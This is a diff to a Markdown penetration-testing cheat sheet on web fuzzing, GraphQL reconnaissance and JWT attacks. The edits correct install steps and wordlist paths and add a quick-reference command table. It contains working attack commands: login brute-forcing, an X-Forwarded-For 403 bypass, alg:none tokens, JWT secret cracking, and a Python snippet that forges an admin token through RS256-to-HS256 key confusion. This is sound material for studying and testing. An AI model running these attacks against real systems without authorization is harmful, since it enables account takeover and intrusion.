@@ -4,7 +4,7 @@
 
 ## What is this?
 
-Automated input injection to discover hidden endpoints, parameters, files, vhosts, and vulnerabilities. Core web recon technique — brute-force dirs/files/params/APIs, fuzz inputs for injection flaws, and map the attack surface before exploitation.
+Automated input injection to discover hidden endpoints, parameters, files, vhosts, and vulnerabilities. Core web recon technique — brute-force dirs/files/params/APIs, fuzz inputs for injection flaws, and map the attack surface before exploitation. Pairs with [[API Attacks]], [[GraphQL]], [[JWT Attacks]], [[WebSockets]].
 
 ---
 
@@ -243,8 +243,9 @@ ffuf -u http://api.target.com/login -X POST -d '{"username":"admin","password":"
 # User-Agent fuzzing
 ffuf -u http://target.com/admin -H "User-Agent: FUZZ" -w /usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt -mc 200,302
 
-# X-Forwarded-For bypass
-ffuf -u http://target.com/admin -H "X-Forwarded-For: FUZZ" -w /usr/share/seclists/Fuzzing/IPs.txt -mc 200,302
+# X-Forwarded-For bypass (no stock IP list — generate one)
+# e.g.  seq 1 255 | sed 's/^/10.0.0./' > internal_ips.txt   (or add 127.0.0.1, 192.168.x.x)
+ffuf -u http://target.com/admin -H "X-Forwarded-For: FUZZ" -w internal_ips.txt -mc 200,302
 
 # Cookie value fuzzing
 ffuf -u http://target.com/profile -b "session=FUZZ" -w sessions.txt -mc 200 -fs <unauth_size>
@@ -265,8 +266,8 @@ ffuf -u http://target.com/profile -b "session=FUZZ" -w sessions.txt -mc 200 -fs 
 | `Discovery/DNS/subdomains-top1million-5000.txt` | Subdomain/vhost fuzzing |
 | `Discovery/DNS/subdomains-top1million-110000.txt` | Thorough subdomain fuzzing |
 | `Fuzzing/LFI/LFI-Jhaddix.txt` | LFI path traversal payloads |
-| `Fuzzing/SQLi.txt` | SQL injection payloads |
-| `Fuzzing/XSS/XSS-Jhaddix.txt` | XSS payloads |
+| `Fuzzing/Databases/SQLi/Generic-SQLi.txt` | SQL injection payloads |
+| `Fuzzing/XSS/robot-friendly/XSS-Jhaddix.txt` | XSS payloads |
 | `Fuzzing/User-Agents/UserAgents.fuzz.txt` | User-agent strings |
 | `Passwords/Default-Credentials/` | Default creds |
 
@@ -916,13 +917,14 @@ curl -s -X POST http://target.com/graphql -H "Content-Type: application/json" -d
 # InQL — Burp extension for GraphQL schema analysis + fuzzing
 # Extensions → BApp Store → InQL
 
-# graphw00f — fingerprint GraphQL engine
-pip3 install graphw00f
-graphw00f -d -t http://target.com/graphql
+# graphw00f — fingerprint GraphQL engine (git clone, run from repo)
+git clone https://github.com/dolevf/graphw00f && cd graphw00f
+python3 main.py -d -f -t http://target.com/graphql
 
 # clairvoyance — recover schema when introspection is disabled
+# (URL is positional, and it needs a wordlist)
 pip3 install clairvoyance
-clairvoyance -u http://target.com/graphql -o schema.json
+clairvoyance -o schema.json -w /usr/share/wordlists/graphql.txt http://target.com/graphql
 ```
 
 ---
@@ -1156,9 +1158,9 @@ subfinder -d target.com -silent | httpx -silent | nuclei -tags cve,misconfig -se
 ### Decode JWT (no tools needed)
 
 ```bash
-# JWT = header.payload.signature (base64url encoded)
-echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d        # decode header
-echo "eyJ1c2VyIjoiZ3Vlc3QifQ" | base64 -d      # decode payload
+# JWT = header.payload.signature (base64URL — translate -_ to +/ before base64 -d)
+echo "eyJhbGciOiJIUzI1NiJ9" | tr '_-' '/+' | base64 -d        # decode header
+echo "eyJ1c2VyIjoiZ3Vlc3QifQ" | tr '_-' '/+' | base64 -d      # decode payload
 ```
 
 ### alg:none Attack
@@ -1181,12 +1183,13 @@ curl http://target.com/admin -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwI
 # hashcat — JWT HS256 = mode 16500
 hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt
 
-# john
+# john — hashcat 16500 is more reliable; john's HMAC-SHA256 format wants `data#hash`,
+# not a bare JWT, so convert first (or just use hashcat above)
 john jwt_token.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
 
-# jwt_tool
-pip3 install jwt_tool
-jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt     # crack secret
+# jwt_tool (git clone — not a PyPI package)
+git clone https://github.com/ticarpi/jwt_tool && cd jwt_tool
+python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt     # crack secret
 ```
 
 ### RS256 → HS256 Key Confusion
@@ -1197,22 +1200,26 @@ If server uses RS256 (asymmetric), switch to HS256 and sign with the public key 
 # jwt_tool
 jwt_tool <token> -X k -pk public_key.pem      # key confusion attack
 
-# Manual — sign HS256 with public key bytes as secret
+# Manual — sign HS256 with the public-key BYTES as the HMAC secret.
+# NOTE: modern PyJWT (2.x) BLOCKS this (raises InvalidKeyError when an asymmetric key
+# is used with HS*), so build the token with raw hmac instead:
 python3 -c "
-import jwt, base64
-pub = open('public.pem').read()
-payload = {'user': 'admin', 'role': 'admin'}
-token = jwt.encode(payload, pub, algorithm='HS256')
-print(token)
+import hmac, hashlib, base64, json
+def b64(x): return base64.urlsafe_b64encode(x).rstrip(b'=').decode()
+secret = open('public.pem','rb').read()          # exact public key bytes the server trusts
+h = b64(json.dumps({'alg':'HS256','typ':'JWT'},separators=(',',':')).encode())
+p = b64(json.dumps({'user':'admin','role':'admin'},separators=(',',':')).encode())
+sig = b64(hmac.new(secret, f'{h}.{p}'.encode(), hashlib.sha256).digest())
+print(f'{h}.{p}.{sig}')
 "
 ```
 
 ### jwt_tool — Swiss Army Knife
 
 ```bash
-pip3 install jwt_tool
+git clone https://github.com/ticarpi/jwt_tool && cd jwt_tool   # not a PyPI package
 
-jwt_tool <token>                        # decode and display
+python3 jwt_tool.py <token>             # decode and display
 jwt_tool <token> -T                     # tamper — interactive mode
 jwt_tool <token> -X a                   # alg:none attack
 jwt_tool <token> -X s                   # self-signed (inject own key)
@@ -1236,8 +1243,9 @@ jwt_tool <token> -I -pc user -pv admin  # inject claim
 ### Encoding Payloads
 
 ```bash
-# URL encode
-ffuf -u "http://target.com/search?q=FUZZ" -w payloads.txt -w /usr/share/seclists/Fuzzing/URL-Encoded.txt
+# URL encode — ffuf has a built-in urlencode input processor (cleaner than a wordlist):
+ffuf -u "http://target.com/search?q=FUZZ" -w payloads.txt:FUZZ -enc FUZZ:urlencode
+# (SecLists also ships '/usr/share/seclists/Fuzzing/special-chars + urlencoded.txt')
 
 # Double URL encode (bypass single-decode WAFs)
 # < becomes %253c (encode % to %25, then c)
@@ -1407,6 +1415,34 @@ cat results.json | jq '.results[] | {url: .url, status: .status, length: .length
 
 ---
 
+## Quick Reference
+
+| Goal | Command |
+|---|---|
+| Dir fuzz (auto-calibrate) | `ffuf -u http://target.com/FUZZ -w raft-medium-directories.txt -ac` |
+| Recursive dir fuzz | `ffuf -u http://target.com/FUZZ -w raft-medium-directories.txt -recursion -recursion-depth 3 -mc 200,301,302,403` |
+| File/extension fuzz | `ffuf -u http://target.com/FUZZ -w raft-medium-words-lowercase.txt -e .php,.html,.txt,.bak -mc 200` |
+| Param name fuzz | `ffuf -u "http://target.com/search?FUZZ=test" -w burp-parameter-names.txt -fs <default>` |
+| POST login brute force | `ffuf -u http://target.com/login -X POST -d "username=admin&password=FUZZ" -w rockyou.txt -fc 401` |
+| Vhost fuzz | `ffuf -u http://TARGET_IP -H "Host: FUZZ.target.com" -w subdomains-top1million-5000.txt -fs <default>` |
+| Multi-position (users+passwords) | `ffuf -u http://target.com/login -d "username=USER&password=PASS" -w users.txt:USER -w rockyou.txt:PASS -mode pitchfork -fc 401` |
+| Gobuster dir | `gobuster dir -u http://target.com -w raft-medium-directories.txt -x php,html,txt -t 50` |
+| Gobuster vhost | `gobuster vhost -u http://target.com -w subdomains-top1million-5000.txt --append-domain -t 50` |
+| Recursive discovery (auto) | `feroxbuster -u http://target.com -w raft-medium-directories.txt` |
+| API-aware fuzzing | `kr scan http://target.com -w routes-large.kite` |
+| Hidden parameter discovery | `arjun -u http://target.com/search -m GET` |
+| Template-based vuln scan | `nuclei -u http://target.com -tags cve,exposure,default-login -severity high,critical` |
+| First-pass web scan | `nikto -h http://target.com` |
+| 403 bypass probe | `curl http://target.com/admin -H "X-Forwarded-For: 127.0.0.1"` / try `/admin/.`, `/admin%2f`, `-X POST` |
+| GraphQL introspection | `curl -X POST http://target.com/graphql -d '{"query":"{ __schema { types { name } } }"}'` |
+| JWT alg:none | `jwt_tool <token> -X a` |
+| JWT secret crack | `hashcat -m 16500 jwt_token.txt rockyou.txt` |
+| Race condition (single packet) | Turbo Intruder `examples/raceConditionFullSpeed.py`, `concurrentConnections=1` |
+| WebSocket manual fuzz | `wscat -c ws://target.com/ws -H "Authorization: Bearer <token>"` |
+| Route interesting hits through Burp only | `ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403 -replay-proxy http://127.0.0.1:8080` |
+
+---
+
 *Created: 2026-03-02*
-*Updated: 2026-05-14*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-07-27*
+*Model: claude-sonnet-5*
